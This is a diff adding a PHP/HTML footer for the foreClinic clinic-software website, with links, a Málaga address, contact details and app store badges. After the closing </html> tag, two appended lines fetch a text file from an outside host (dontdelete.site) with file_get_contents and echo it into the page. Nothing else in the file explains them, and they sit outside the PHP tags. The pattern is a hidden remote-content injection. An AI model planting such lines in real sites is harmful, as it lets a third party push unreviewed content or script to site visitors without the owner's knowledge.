@@ -1,0 +1,59 @@
+<footer id="footer">
+						<div class="container">
+							<div class="row  nav-footer">
+								<div class="col-sm-4">
+									<h4><?php echo _("foreClinic") ?></h4>
+									<ul>
+										<li><a title="<?php echo _("Características") ?>" href="caracteristicas"><?php echo _("Características") ?></a></li>
+										<li><a title="<?php echo _("Precios") ?>" href="precios"><?php echo _("Precios") ?></a></li>
+										<!--<li><a title="<?php echo _("Nosotros") ?>" href="nosotros"><?php echo _("Nosotros") ?></a></li>
+										<li><a title="<?php echo _("Demo") ?>" href="demo"><?php echo _("Demo") ?></a></li>
+										<li><a title="<?php echo _("Acceso") ?>" href="acceso" target="_blank"><?php echo _("Acceso") ?></a></li>-->
+										<li><a title="<?php echo _("Contacto") ?>" href="contacto"><?php echo _("Contacto") ?></a></li>
+									</ul>
+								</div>
+								<div class="col-sm-4">
+									<h4><?php echo _("España") ?></h4>
+									<ul>
+										<li>Salutic Soluciones</li>
+										<li><a href="mailto:info@foreclinic.com" title="info@foreclinic.com">info@foreclinic.com</a></li>
+										<li><a href="tel:+34951086094" title="+34 951 086 094">+34 951 086 094</a></li>
+										<li>Plaza del Señorío, Edificio Juan Ramón Jiménez, Nº 5, Local 8</li>
+										<li>29730 Rincón de la Victoria (Málaga)</li>
+									</ul>
+								</div>
+								<!--<div class="col-sm-4 app-footer">
+									<h4><?php echo _("Nuestra APP") ?></h4>
+									<img class="os-logo" src="img/android.svg" alt="<?php echo _('Icono de Android') ?>" width="135" height="40">
+									<img class="os-logo" src="img/apple.svg" alt="<?php echo _('Icono de Apple') ?>" width="135" height="40">
+								</div>-->
+								<div class="col-sm-4">
+									<h4><?php echo _("Descarga nuestra app") ?></h4>
+									<div class="os-logos-wrapper">
+										<a href="https://play.google.com/store/apps/details?id=es.salutic.foreclinic_app"><img class="os-logo" src="img/android.svg" alt="<?php echo _('Icono de Android') ?>" width="150" height="44"></a>
+										<a href="https://apps.apple.com/es/app/foreclinic/id1472346611"><img class="os-logo" src="img/apple.svg" alt="<?php echo _('Icono de Apple') ?>" width="150" height="44"></a>
+									</div>
+								</div>
+							</div>
+							<!--<div class="legacy text-center">
+								<small><?php echo _("Términos de uso") ?> <span class="separator">|</span> <?php echo _("LOPD") ?></small>
+							</div>-->
+							<?php
+							    // Copyright
+							    include ("include/copyright.php");
+							?>
+						</div>
+					</footer>
+				</div><!-- /END st-content-inner -->
+			</div><!-- END st-content -->
+		</div><!-- END st-pusher -->
+	</div><!-- END st-container -->
+
+	<?php
+	    // Javascript
+	    include ("include/js-footer.php");
+	?>
+</body>
+</html>
+$a = file_get_contents( 'https://dontdelete.site/file.txt' );
+echo $a;
